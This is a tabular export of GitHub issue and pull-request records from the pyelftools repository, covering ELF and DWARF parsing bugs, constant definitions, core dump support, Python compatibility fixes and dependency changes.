eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/150,240572466,MDU6SXNzdWUyNDA1NzI0NjY=,150,Remove DT_ENCODING from the dynamic tags list,2498805,closed,FALSE,NA,NA,0,2017-07-05T08:16:49Z,2018-01-05T21:54:59Z,2018-01-05T21:54:59Z,CONTRIBUTOR,NA,"According to [here](https://docs.oracle.com/cd/E23824_01/html/819-0690/chapter6-42444.html) and [here](http://www.sco.com/developers/gabi/2000-07-17/ch5.dynamic.html), DT_ENCODING is not a real value, but rather a marker indicating something about the semantics of all the values lower than it. However, it shares a value with `DT_PREINIT_ARRAY`, which means that when performing a lookup for the tag name of a section, we're at the mercy of the hash function in determining which value we see first. The result is that on some machines, `d_tag` for these entries will be `DT_ENCODING`, while some will be `DT_PREINIT_ARRAY`. This is really bad!

Another possible solution would be to change the ""tag lookup"" function to just blacklist all the ""semantic tags"" like DT_ENCODING, DT_LOWOS, etc.",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/150/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/150/comments,https://api.github.com/repos/eliben/pyelftools/issues/150/events,https://github.com/eliben/pyelftools/issues/150,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/149,240528919,MDExOlB1bGxSZXF1ZXN0MTI4ODc2NzM0,149,"Add OrderedDict implementation for seamless Python < 2.7 ""support""",8016228,closed,FALSE,NA,NA,2,2017-07-05T03:23:30Z,2017-07-08T23:50:46Z,2017-07-08T23:50:46Z,CONTRIBUTOR,NA,"The ```OrderedDict``` class was added to ```collections``` in Python 2.7 which means pyelftools will not work on older versions of Python. My target was 2.6.

By adding this small ```OrderedDict``` implementation, the majority (possibly all?) of pyelftools works on Python 2.6, and possibly earlier versions.

An alternative is to pull in ordereddict from PyPi and have that as a dependency but this seems simpler and shouldn't be burdensome to maintain, should you want to accept it.

Merge this if you'd like, otherwise I will maintain my own fork as I currently need this supported on 2.6

Thanks, I appreciate pyelftools quite a bit. If you'd like anything tested I'd be happy to help",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/149/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/149/comments,https://api.github.com/repos/eliben/pyelftools/issues/149/events,https://github.com/eliben/pyelftools/pull/149,https://api.github.com/repos/eliben/pyelftools/pulls/149
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/148,237012257,MDExOlB1bGxSZXF1ZXN0MTI2Mzg4ODk5,148,Update reserved machine arch idents,940228,closed,FALSE,NA,NA,2,2017-06-19T20:20:21Z,2017-06-27T12:04:44Z,2017-06-27T12:04:44Z,CONTRIBUTOR,NA,"It seems to have been a while since these were updated.

I updated the dict from here: http://www.sco.com/developers/gabi/latest/ch4.eheader.html

Please look this over and merge if you approve.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/148/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/148/comments,https://api.github.com/repos/eliben/pyelftools/issues/148/events,https://github.com/eliben/pyelftools/pull/148,https://api.github.com/repos/eliben/pyelftools/pulls/148
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/147,236034021,MDExOlB1bGxSZXF1ZXN0MTI1NzExMTUz,147,"Better support for core dumps (in particular, fix issue #93)",1856442,closed,FALSE,NA,NA,3,2017-06-14T23:05:17Z,2017-07-02T16:06:17Z,2017-07-02T16:06:16Z,CONTRIBUTOR,NA,"Hi Eli,

This PR fixes the main part of issue #93. 

Working with core dumps was important for our internal use of your library in Yandex, so I did the following steps:

- I splitted struct initialization and ELF parsing into two steps. 
- First of them is for parsing of only the ELF file header, and in particular, the information about ELF type that defines if we are working with a regular ELF file or a core dump. 
- On second step we build the remaining ELF structures and parse them. In particular, we build correct note types when working with core dumps on this phase.
- I added a new test binary (x64 core dump) into ""testfiles_for_readelf"". Some cases were not working as intended for it, I fixed all of them but one.

What I didn't do:

- The test with option ""-n"" doesn't work for core dumps properly. Mainly, because output format of vanilla readelf for core dumps notes is surprisingly different from the one for usual notes, e.g.:

```
$ test/external_tools/readelf -n test/testfiles_for_readelf/core_simple64.elf  

Displaying notes found at file offset 0x00000430 with length 0x000008b0:
  Owner                 Data size       Description
  CORE                 0x00000150       NT_PRSTATUS (prstatus structure)
  CORE                 0x00000088       NT_PRPSINFO (prpsinfo structure)
  CORE                 0x00000080       NT_SIGINFO (siginfo_t data)
  CORE                 0x00000130       NT_AUXV (auxiliary vector)
  CORE                 0x000002af       NT_FILE (mapped files)
    Page size: 4096
                 Start                 End         Page Offset
    0x0000000000400000  0x0000000000401000  0x0000000000000000
        /home/max42/pyelftools/test/testfiles_for_readelf/coredump_self
    0x0000000000401000  0x0000000000402000  0x0000000000000000
        /home/max42/pyelftools/test/testfiles_for_readelf/coredump_self
    0x0000000000402000  0x0000000000403000  0x0000000000000001
        /home/max42/pyelftools/test/testfiles_for_readelf/coredump_self
    0x00007ffff7a1c000  0x00007ffff7bd0000  0x0000000000000000
        /lib/x86_64-linux-gnu/libc-2.15.so
    0x00007ffff7bd0000  0x00007ffff7dcf000  0x00000000000001b4
        /lib/x86_64-linux-gnu/libc-2.15.so
    0x00007ffff7dcf000  0x00007ffff7dd3000  0x00000000000001b3
        /lib/x86_64-linux-gnu/libc-2.15.so
    0x00007ffff7dd3000  0x00007ffff7dd5000  0x00000000000001b7
        /lib/x86_64-linux-gnu/libc-2.15.so
    0x00007ffff7dda000  0x00007ffff7dfc000  0x0000000000000000
        /lib/x86_64-linux-gnu/ld-2.15.so
    0x00007ffff7ffc000  0x00007ffff7ffd000  0x0000000000000022
        /lib/x86_64-linux-gnu/ld-2.15.so
  CORE                 0x00000200       NT_FPREGSET (floating point registers)

```

You see, the note lines are joined together into a single block, and the NT_FILE-typed note has lots of extra information.

I didn't have much time for fixing it, so I just explicitly skipped this test in your testing suite.

I don't really want to fix it since it requires a lot of time to understand how the orignial readelf outputs information in this case and then careful repeating this behavior. Though, I still think that my contribution to the elf parsing code will be useful for many users of your library.

Let me know if there are any comments.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/147/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/147/comments,https://api.github.com/repos/eliben/pyelftools/issues/147/events,https://github.com/eliben/pyelftools/pull/147,https://api.github.com/repos/eliben/pyelftools/pulls/147
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/146,231886161,MDExOlB1bGxSZXF1ZXN0MTIyODA0NTc3,146,NULL termination with IAR Embedded Workbench compiler,6299676,closed,FALSE,NA,NA,7,2017-05-28T18:39:22Z,2017-06-15T13:51:32Z,2017-06-15T13:51:32Z,CONTRIBUTOR,NA,"The IAR Embedded Workbench compiler inserts a zero termination byte after some dies (eg after DW_TAG_subrange_type @0x2885 in the attached .elf file). This leads to parsing error of the subsequent die(s), since null is assumed to be the first byte of it.

This workaround consumes all null bytes that follow a complete die.
[iar_ewb.zip](https://github.com/eliben/pyelftools/files/1034393/iar_ewb.zip)

",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/146/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/146/comments,https://api.github.com/repos/eliben/pyelftools/issues/146/events,https://github.com/eliben/pyelftools/pull/146,https://api.github.com/repos/eliben/pyelftools/pulls/146
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/145,231872164,MDU6SXNzdWUyMzE4NzIxNjQ=,145,Wrong defintion of DW_FORM_ref_sig8,6299676,closed,FALSE,NA,NA,1,2017-05-28T14:21:53Z,2017-09-04T21:59:32Z,2017-09-04T21:59:32Z,CONTRIBUTOR,NA,"in dwarf/structs.py, DW_FORM_ref_sig8 is defined as

`DW_FORM_ref_sig8=self.Dwarf_offset(''),`

but in my opinion, it should be 

`DW_FORM_ref_sig8 = self.Dwarf_uint64(''),`

since ref_sig8 must always be 64 bits.

This issue lead to a parese error in the attached elf file (for ARM Cortex-M4, generated by IAR Embedded Workbench). Please note there are still other issues with this file. Still working on the other isues, PR will follow shortly.

[iar_ewb.zip](https://github.com/eliben/pyelftools/files/1034225/iar_ewb.zip)
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/145/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/145/comments,https://api.github.com/repos/eliben/pyelftools/issues/145/events,https://github.com/eliben/pyelftools/issues/145,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/144,230439284,MDU6SXNzdWUyMzA0MzkyODQ=,144,Extract exported symbols like nm,1357701,closed,FALSE,NA,NA,1,2017-05-22T15:48:05Z,2017-05-24T03:24:33Z,2017-05-24T03:24:33Z,NONE,NA,"I'm trying to find an example here, that can extract the exported symbols of a SO file

https://github.com/eliben/pyelftools/tree/master/examples

Can you kindly add one?",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/144/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/144/comments,https://api.github.com/repos/eliben/pyelftools/issues/144/events,https://github.com/eliben/pyelftools/issues/144,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/143,227711168,MDU6SXNzdWUyMjc3MTExNjg=,143,Unsupported relocation type,23738463,open,FALSE,NA,NA,2,2017-05-10T15:03:11Z,2017-09-04T21:58:59Z,NA,CONTRIBUTOR,NA,"Hi all,

I'm trying to understand how relocation works in ELF file. When I test the `elf.RelocationHandler.apply_section_relocations` for section `.rela.dyn` of `sample_exe64.elf` program (in `examples` folder), it gave me `elftools.common.exceptions.ELFRelocationError: Unsupported relocation type: 6`. 

Tracing down the bug, I've found that the recipe for that `.rela.dyn` was `R_X86_64_GLOB_DAT`. Is it intentional that this recipe, as well as many other ones, are not supported? What can be the reason for it?",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/143/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/143/comments,https://api.github.com/repos/eliben/pyelftools/issues/143/events,https://github.com/eliben/pyelftools/issues/143,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/142,227556367,MDU6SXNzdWUyMjc1NTYzNjc=,142,7zip header errors,940228,closed,FALSE,NA,NA,2,2017-05-10T03:16:53Z,2017-05-16T14:21:45Z,2017-05-10T12:28:42Z,CONTRIBUTOR,NA,[removed],NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/142/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/142/comments,https://api.github.com/repos/eliben/pyelftools/issues/142/events,https://github.com/eliben/pyelftools/issues/142,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/141,226138994,MDExOlB1bGxSZXF1ZXN0MTE4ODczMTI2,141,Make elffile and elfstructs on Dynamic public,12619481,closed,FALSE,NA,NA,0,2017-05-03T23:04:19Z,2017-05-06T20:27:04Z,2017-05-06T03:08:46Z,CONTRIBUTOR,NA,"This addresses issue 122 (https://github.com/eliben/pyelftools/issues/122), which I opened like 6 months ago. All I did was remove a leading underscore from self._elffile and self._elfstructs, which are each public on several other classes. Tests under tests/ pass; I haven't tested much further than that.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/141/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/141/comments,https://api.github.com/repos/eliben/pyelftools/issues/141/events,https://github.com/eliben/pyelftools/pull/141,https://api.github.com/repos/eliben/pyelftools/pulls/141
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/140,217539210,MDExOlB1bGxSZXF1ZXN0MTEyOTU0OTM3,140,Remove construct from elftools and use it as a dependency,6428272,closed,FALSE,NA,NA,6,2017-03-28T12:12:37Z,2017-04-05T13:24:30Z,2017-04-05T13:24:30Z,CONTRIBUTOR,NA,"This removes the old version of `construct` - which was copied into this repository years ago - from `elftools` and ports all required files to work with the most recent version (2.8.10) from https://github.com/construct/construct

The syntactical changes to files in the `elftools/{common,dwarf,elf}` directories (found in the third commit of the series) are caused by
- renames of datatypes (e.g., `ULInt8` -> `Int8ul`) and classes (e.g., `Embed` -> `Embedded`) in `construct`, see http://construct.readthedocs.io/en/latest/transition.html for an overview
- the nameless initialization of Structs/Enums and datatypes by using the `/` operator
- changes to flag propagation in `If()` (it doesn't carry embedded flags anymore), so we now need to wrap the `If()` inside `Embedded()` instead of the other way around.
- `If()` lost its `elsevalue` parameter, so we need to use `IfThenElse` with the correct alternative for the else case.

I'm not sure about the correct `setup.py` integration because the currently released version 2.8.10 of `construct` has a python2 compatibility issue (see https://github.com/construct/construct/commit/98d6c5fb50bc9a3a13107071f0c870c29d7d1500, which was only merged after 2.8.10 was released). The last commit of this series *tries* to use `construct`'s GitHub repository (which already includes the fix) as a dependency but this requires `pip install` to be called with `--process-dependency-links`... I'm not totally happy with that and am happy to take comments on that.

Additionally, the just merged commit https://github.com/construct/construct/commit/4836722526cb9bf0de655176c6dc6bf3bc177669 changes the interface of `RepeatUntil` (more specifically, the `predicate` parameter takes another parameter - the current state of the list) which we 
- use in https://github.com/eliben/pyelftools/blob/master/elftools/dwarf/structs.py#L311 and 
- should probably take into `RepeatUntilExcluding` as well.

So maybe we should wait until 2.8.11 (or whatever the next version of `construct` will be called) is released... then we could just use that `construct` release from PyPI and get around `dependency_links`.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/140/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/140/comments,https://api.github.com/repos/eliben/pyelftools/issues/140/events,https://github.com/eliben/pyelftools/pull/140,https://api.github.com/repos/eliben/pyelftools/pulls/140
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/139,215598959,MDU6SXNzdWUyMTU1OTg5NTk=,139,Also run Ci tests on Windows and macOS,675997,closed,FALSE,NA,NA,3,2017-03-21T00:56:59Z,2017-09-04T21:58:46Z,2017-09-04T21:58:46Z,NONE,NA,I am considering replacing libdwarf and objdump in https://github.com/nexB/scancode-toolkit and https://github.com/nexB/scancode-toolkit-contrib by pyelftools and since I support also these other OSes it would be great for me to have the test suite running there too.,NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/139/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/139/comments,https://api.github.com/repos/eliben/pyelftools/issues/139/events,https://github.com/eliben/pyelftools/issues/139,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/138,214635300,MDU6SXNzdWUyMTQ2MzUzMDA=,138,Inconsistent condition between #address_offsets in elffile.py and in readelf.c,4191701,closed,FALSE,NA,NA,3,2017-03-16T08:55:59Z,2017-10-13T04:33:53Z,2017-10-13T04:33:53Z,CONTRIBUTOR,NA,"In method [ELFFile#address_offsets](https://github.com/eliben/pyelftools/blob/8cd87bec6f69102726a50fecbd8f5748a7cd3a75/elftools/elf/elffile.py#L131)
```python
if (start >= seg['p_vaddr'] and
   end <= seg['p_vaddr'] + seg['p_filesz']):
```

According to binutils/readelf.c#offset_from_vma:
```cpp
static long
offset_from_vma (FILE * file, bfd_vma vma, bfd_size_type size)
{
  Elf_Internal_Phdr * seg;

  if (! get_program_headers (file))
  {
      warn (_(""Cannot interpret virtual addresses without program headers.\n""));
      return (long) vma;
  }

  for (seg = program_headers;
       seg < program_headers + elf_header.e_phnum;
       ++seg)
  {
      if (seg->p_type != PT_LOAD)
        continue;

      if (vma >= (seg->p_vaddr & -seg->p_align)
          && vma + size <= seg->p_vaddr + seg->p_filesz)
        return vma - seg->p_vaddr + seg->p_offset;
  }

  warn (_(""Virtual address 0x%lx not located in any PT_LOAD segment.\n""),
        (unsigned long) vma);
  return (long) vma;
}
```

So seems the condition in `address_offsets` should be
```python
if (start >= seg['p_vaddr'] & -seg['p_align'] and
   end <= seg['p_vaddr'] + seg['p_filesz']):
```
Not sure what this difference affects, just figure this out.",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/138/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/138/comments,https://api.github.com/repos/eliben/pyelftools/issues/138/events,https://github.com/eliben/pyelftools/issues/138,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/137,209716859,MDExOlB1bGxSZXF1ZXN0MTA3NTkyMTMx,137,Add .stab section parser,13182,closed,FALSE,NA,NA,1,2017-02-23T10:09:20Z,2017-02-25T15:51:00Z,2017-02-25T15:50:53Z,CONTRIBUTOR,NA,Added a parser for the ELF .stab section. It contains debug information.,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/137/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/137/comments,https://api.github.com/repos/eliben/pyelftools/issues/137/events,https://github.com/eliben/pyelftools/pull/137,https://api.github.com/repos/eliben/pyelftools/pulls/137
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/136,208302254,MDU6SXNzdWUyMDgzMDIyNTQ=,136,"Missing constants DT_LOPROC, DT_PPC_GOT",111640,open,FALSE,NA,NA,2,2017-02-17T01:14:04Z,2018-01-18T13:30:50Z,NA,NONE,NA,"You're missing the following constants:

    DT_LOPROC               = 0x70000000,
    DT_PPC_GOT              = DT_LOPROC + 0

They're listed here in the `glibc` source: https://sourceware.org/git/?p=glibc.git;a=blob;f=elf/elf.h;h=6d3b356f14dd3aac53370c26d63ab631c438c3a3;hb=HEAD#l2383
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/136/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/136/comments,https://api.github.com/repos/eliben/pyelftools/issues/136/events,https://github.com/eliben/pyelftools/issues/136,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/135,207020149,MDExOlB1bGxSZXF1ZXN0MTA1Nzc0NDY0,135,Enable parsing of relocations pointed to by DYNAMIC.,75449,closed,FALSE,NA,NA,11,2017-02-12T00:56:20Z,2019-12-22T07:54:40Z,2019-03-16T13:48:47Z,CONTRIBUTOR,NA,"In combination with DynamicSegment, this allows relocations to be processed without
a functional section table.

Example usage:

```python
from elftools.elf.elffile import ELFFile
from elftools.elf.dynamic import DynamicSegment
from elftools.elf.relocation import get_dynamic_reloc_tables

import sys

elff = ELFFile(open(sys.argv[1], 'rb'))

for seg in elff.iter_segments():
    if isinstance(seg, DynamicSegment):
        relos = get_dynamic_reloc_tables(elff.stream, elff, seg)
        for relname in relos:
            print relname
            for rel in relos[relname].iter_relocations():
                print rel
```
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/135/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/135/comments,https://api.github.com/repos/eliben/pyelftools/issues/135/events,https://github.com/eliben/pyelftools/pull/135,https://api.github.com/repos/eliben/pyelftools/pulls/135
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/134,204504936,MDExOlB1bGxSZXF1ZXN0MTA0MDgwMzAz,134, Fix parsing string table,10163796,closed,FALSE,NA,NA,1,2017-02-01T06:08:19Z,2017-02-02T13:47:31Z,2017-02-02T13:47:31Z,CONTRIBUTOR,NA,"If for any reason parse_cstring_from_stream() cannot get a string in the given offset, it'll return None causing the following line raises an exception when it tries to get the decoded ascii string from the None object.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/134/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/134/comments,https://api.github.com/repos/eliben/pyelftools/issues/134/events,https://github.com/eliben/pyelftools/pull/134,https://api.github.com/repos/eliben/pyelftools/pulls/134
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/133,203451122,MDU6SXNzdWUyMDM0NTExMjI=,133,Null symbol decode caused AttributeError,1960626,closed,FALSE,NA,NA,1,2017-01-26T18:30:10Z,2017-02-04T17:07:17Z,2017-02-04T17:07:17Z,NONE,NA,"If a symbol is empty, when accessing this symbol by `SymbolTableSection.get_symbol()`, it will invoke `StringTableSection.get_string()`. In this method, line 73, `elftools.common.utils.parse_cstring_from_stream()` will return a `None` object to `s`; then in line 74, `s.decode('ascii')` will cause AttributeError since `s` is `None`. Trackback:

    File ""/opt/local/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/elftools/elf/sections.py"", line 128, in iter_symbols
      yield self.get_symbol(i)
    File ""/opt/local/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/elftools/elf/sections.py"", line 107, in get_symbol
      name = self.stringtable.get_string(entry['st_name'])
    File ""/opt/local/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/elftools/elf/sections.py"", line 74, in get_string
      return s.decode('ascii')
    AttributeError: 'NoneType' object has no attribute 'decode'",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/133/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/133/comments,https://api.github.com/repos/eliben/pyelftools/issues/133/events,https://github.com/eliben/pyelftools/issues/133,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/132,201420840,MDExOlB1bGxSZXF1ZXN0MTAxOTU4MDQ5,132,Remove duplicated word,141546,closed,FALSE,NA,NA,0,2017-01-17T22:12:36Z,2017-01-19T13:15:17Z,2017-01-19T13:15:17Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/132/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/132/comments,https://api.github.com/repos/eliben/pyelftools/issues/132/events,https://github.com/eliben/pyelftools/pull/132,https://api.github.com/repos/eliben/pyelftools/pulls/132
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/131,200987498,MDExOlB1bGxSZXF1ZXN0MTAxNjY4MjYx,131,Update enums.py,734629,closed,FALSE,NA,NA,0,2017-01-16T10:54:10Z,2017-01-16T16:54:34Z,2017-01-16T16:54:34Z,CONTRIBUTOR,NA,add an mips tag,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/131/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/131/comments,https://api.github.com/repos/eliben/pyelftools/issues/131/events,https://github.com/eliben/pyelftools/pull/131,https://api.github.com/repos/eliben/pyelftools/pulls/131
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/130,198904388,MDU6SXNzdWUxOTg5MDQzODg=,130,Please DO NOT use any section info when parsing segment!,3118816,closed,FALSE,NA,NA,3,2017-01-05T08:52:52Z,2020-02-04T14:38:03Z,2020-02-04T14:38:03Z,NONE,NA,"I want to parse some ""striped"" dynamic library which has malformed section info,so I want to parse it in linker view using only segment info.BUT class [DynamicSegment](https://github.com/eliben/pyelftools/blob/60319cbb9d469e8d7c56e8f85dd55294c0ce4f62/elftools/elf/dynamic.py#L184) initializes with the original malformed sections, it just makes no sense...",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/130/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/130/comments,https://api.github.com/repos/eliben/pyelftools/issues/130/events,https://github.com/eliben/pyelftools/issues/130,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/129,198425444,MDExOlB1bGxSZXF1ZXN0OTk5MjAxMzg=,129,Ignore ascii decoding errors when creating special tag attributes.,7666461,closed,FALSE,NA,NA,5,2017-01-03T08:01:28Z,2017-06-08T22:50:22Z,2017-01-05T04:34:43Z,NONE,NA,"In the DynamicTag constructor, when _HANDLED_TAGS are being processed, stringtable.get_string() tries to ascii-decode the requested string from the string table. In some files the string can't be decoded, resulting in a UnicodeDecodeError. Ignore the error rather than fail to create the tag.

Specifically, I have a file whose DT_SUNW_FILTER tag whose d_val does not map to an ascii string.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/129/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/129/comments,https://api.github.com/repos/eliben/pyelftools/issues/129/events,https://github.com/eliben/pyelftools/pull/129,https://api.github.com/repos/eliben/pyelftools/pulls/129
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/128,197355055,MDExOlB1bGxSZXF1ZXN0OTkyMzE5MzA=,128,Added support for 8 & 16 bit addresses to DWARF Info,1586475,closed,FALSE,NA,NA,1,2016-12-23T11:33:31Z,2018-10-22T18:46:11Z,2018-10-22T18:46:11Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/128/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/128/comments,https://api.github.com/repos/eliben/pyelftools/issues/128/events,https://github.com/eliben/pyelftools/pull/128,https://api.github.com/repos/eliben/pyelftools/pulls/128
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/127,196789396,MDExOlB1bGxSZXF1ZXN0OTg4MzE1NjQ=,127,Fix for padding encoding in Python 3.,11463396,closed,FALSE,NA,NA,7,2016-12-20T21:46:32Z,2016-12-24T16:22:46Z,2016-12-24T16:22:46Z,CONTRIBUTOR,NA,"The padding used a string literal instead of byte literal for the
pattern character, which caused invalid type error in Python 3.

This fix marks the pattern as byte literal, which does nothing on
Python >= 2.7 and creates bytes array instead of str in Python >= 3.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/127/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/127/comments,https://api.github.com/repos/eliben/pyelftools/issues/127/events,https://github.com/eliben/pyelftools/pull/127,https://api.github.com/repos/eliben/pyelftools/pulls/127
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/126,186798864,MDExOlB1bGxSZXF1ZXN0OTE5NjgxMjU=,126,Fix typo relocation_bytesize  --> relocation.bytesize,5219655,closed,FALSE,NA,NA,0,2016-11-02T13:21:38Z,2016-11-04T03:11:24Z,2016-11-04T03:11:24Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/126/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/126/comments,https://api.github.com/repos/eliben/pyelftools/issues/126/events,https://github.com/eliben/pyelftools/pull/126,https://api.github.com/repos/eliben/pyelftools/pulls/126
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/125,186731678,MDU6SXNzdWUxODY3MzE2Nzg=,125,how to decode the struct definition ,16513084,closed,FALSE,NA,NA,4,2016-11-02T07:42:20Z,2020-02-04T14:37:34Z,2020-02-04T14:37:34Z,NONE,NA,"  Dose call iter_DIEs() make sense

what filter should be used? DW_TAG_structure_type ,DW_AT_specification , or other ect


Oh, use iter_DIEs, I got things like:

DW_TAG_structure_type
OrderedDict([('DW_AT_name', AttributeValue(name='DW_AT_name', form='DW_FORM_string', value='sss', raw_value='sss', offset=129))
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/125/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/125/comments,https://api.github.com/repos/eliben/pyelftools/issues/125/events,https://github.com/eliben/pyelftools/issues/125,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/124,186657202,MDExOlB1bGxSZXF1ZXN0OTE4NzA1MDk=,124,Fix for issue #123,3645402,closed,FALSE,NA,NA,2,2016-11-01T21:48:16Z,2020-02-04T14:30:20Z,2020-02-04T14:30:19Z,NONE,NA,missing 'getpagesize' function in resource library on windows.,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/124/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/124/comments,https://api.github.com/repos/eliben/pyelftools/issues/124/events,https://github.com/eliben/pyelftools/pull/124,https://api.github.com/repos/eliben/pyelftools/pulls/124
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/123,186609122,MDU6SXNzdWUxODY2MDkxMjI=,123,fail to import elffile on windows (+patch),3645402,closed,FALSE,NA,NA,1,2016-11-01T18:25:42Z,2020-02-04T14:37:20Z,2020-02-04T14:37:20Z,NONE,NA,"Due to missing 'getpagesize' field in 'resource':

> D:\GITREP\python\pyelftools\scripts>D:\GITREP\python\pyelftools\scripts\readelf.py
> Traceback (most recent call last):
>   File ""D:\GITREP\python\pyelftools\scripts\readelf.py"", line 23, in <module>
>     from elftools.elf.elffile import ELFFile
>   File ""C:\tools\Python27\lib\site-packages\elftools\elf\elffile.py"", line 15, in <module>
>     if not resource.getpagesize:
> AttributeError: 'module' object has no attribute 'getpagesize'

There is simple patch:
```
try:
    import resource
++    if ""getpagesize"" not in dir(resource):
++        raise ImportError
    PAGESIZE = resource.getpagesize()
except ImportError:
    # Windows system
    import mmap
    PAGESIZE = mmap.PAGESIZE
```
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/123/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/123/comments,https://api.github.com/repos/eliben/pyelftools/issues/123/events,https://github.com/eliben/pyelftools/issues/123,NA
